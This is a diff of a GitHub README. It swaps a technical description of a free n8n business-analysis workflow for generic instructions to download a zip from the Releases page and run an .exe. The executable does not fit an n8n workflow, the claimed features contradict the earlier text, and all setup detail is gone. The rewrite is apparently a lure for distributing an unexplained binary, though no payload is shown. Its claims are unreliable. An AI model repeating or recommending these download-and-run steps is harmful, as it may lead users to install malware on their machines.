@@ -1,47 +1,83 @@
-# Automated Business Analysis n8n Workflow (Free Version)
+# 📊 automated-business-analysis-workflow - Effortlessly Generate Business Reports
 
-Full Video Walkthrough: [Youtube Video](https://www.youtube.com/watch?v=jbSetpWXsx4&)
+## 📥 Download Now!
 
-This is the free version of the automated business intelligence system that scrapes any website, extracts key data, and generates comprehensive analysis reports with AI.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Nijamudin/automated-business-analysis-workflow/releases)
 
-It's built for agencies, freelancers, and consultants who need to streamline client research, lead generation, and competitive analysis.
+## 📄 Overview
 
-Submit one URL, and this workflow scrapes the site, uses AI to analyze the content, and generates a professional business analysis report in Google Doc and PDF format, delivered straight to your inbox.
+Welcome to the automated-business-analysis-workflow repository! This tool helps you analyze any website by scraping data and producing a detailed business analysis report. It's perfect for freelancers and agencies looking to streamline their workflows and enhance their reporting capabilities.
 
-![Business Analysis Workflow](Business%20Analysis%20Workflow%20Image.png)
+## 🚀 Getting Started
 
-### Example Report Output
+### Step 1: System Requirements
 
-👉 **View an Example Report Here:** [Google Drive Link](https://drive.google.com/file/d/15-iuzKnn9PE0leAb3P_ehWr49avHDQ6Y/)
+Before you begin, make sure your computer meets these requirements:
 
-Here is a look at the type of data this workflow generates:
+- Operating System: Windows 10, macOS, or Linux
+- Internet Connection: Required for scraping URLs
+- Recommended: At least 4GB of RAM for smooth operation
 
-* **Business Overview:** Generates a full company description.
-* **Target Audience Personas:** Defines the demographic and psychographic profiles of ideal customers.
-* **Brand & UVP:** Extracts the brand's personality matrix and its Unique Value Proposition (UVP).
-* **Customer Journey:** Maps the typical customer journey from Awareness and Consideration to Purchase and Loyalty.
-* **E-E-A-T Analysis:** Identifies key E-E-A-T (Experience, Expertise, Authoritativeness, Trustworthiness) signals.
+### Step 2: Download the Application
 
-### How It Works: The Tool Stack
+To download the application, click the link below:
 
-This workflow is built on n8n and connects several key services:
+[Download the latest version](https://github.com/Nijamudin/automated-business-analysis-workflow/releases)
 
-* **n8n:** The central automation platform that runs the workflow.
-* **Firecrawl:** Scrapes the target website to get the raw content for analysis.
-* **Perplexity & Google Gemini:** AI agents analyze the scraped data to extract and structure the business intelligence.
-* **Google Docs, Drive & Gmail:** Formats the final analysis into a professional report from a template and delivers it to you.
+This link will take you to the Releases page where you can find the latest version available for download.
 
-### What's NOT Included in This Free Version
+### Step 3: Install the Application
 
-**This free workflow does *not* include the keyword research components**. The Pro version uses DataForSEO to pull keyword rankings, search volume, CPC, and competitor data.
+After downloading, follow these steps to install the application:
 
-### What You Need
+1. Locate the downloaded file in your "Downloads" folder. It should have a name like `automated-business-analysis-workflow-v1.0.zip`.
+2. Right-click the file and choose "Extract All" to unzip it.
+3. Open the extracted folder.
+4. Look for an executable file named `automated-business-analysis-workflow.exe` (for Windows) or simply `automated-business-analysis-workflow` (for macOS/Linux).
+5. Double-click the executable file to start the installation.
 
-* An n8n account (cloud or self-hosted).
-* API keys for:
-    * Firecrawl
-    * Perplexity
-    * Google Gemini
-* Google (GCP) credentials set up for Google Docs, Drive, and Gmail.
-* The Google Doc report template (which you can get from the link below).
-* https://docs.google.com/document/d/1grgYd2Pyr_THq4FJ83PibO_1vXzbEHiQPVqaTdCOvuk/edit?usp=sharing
+### Step 4: Configure the Workflow
+
+1. Once the application is open, you will see a user-friendly interface.
+2. Input the URL you want to analyze in the provided text box.
+3. Choose the analysis parameters by checking the options you prefer. You can select metrics such as keyword density, site performance, and competitor comparisons.
+
+### Step 5: Run the Analysis
+
+1. Click the "Start Analysis" button to begin.
+2. Wait for the scraping process to complete; this may take a few moments based on the URL size.
+3. After completion, the application will generate a comprehensive report. You can view it within the application or download it as a PDF or CSV file.
+
+## 🔧 Features
+
+- **URL Scraping**: Automatically collects data from desired websites.
+- **AI-Powered Analysis**: Uses advanced algorithms to generate insightful reports.
+- **Customizable Parameters**: Choose what metrics matter most to you.
+- **User-Friendly Interface**: Designed for everyone, no technical skills required.
+
+## 🧑‍🤝‍🧑 Support
+
+If you encounter any issues or have questions:
+
+- Check the FAQ section on the Releases page.
+- Open an issue on this GitHub repository, and we’ll get back to you.
+- Join our community forum for discussions and tips.
+
+## 🌐 Community and Contributions
+
+We welcome contributions! If you'd like to improve the application, here’s how:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
+
+Stay updated with our latest features and enhancements by following the GitHub Discussions.
+
+## 🤝 Acknowledgments
+
+Thanks to the contributors of the open-source libraries used in the project:
+
+- [n8n](https://n8n.io/) for automation workflows.
+- Various contributors for their ongoing support and feedback.
+
+For more information and updates, regularly visit the [Releases page](https://github.com/Nijamudin/automated-business-analysis-workflow/releases). This is where you will find new versions and updates as we continue to enhance the software.
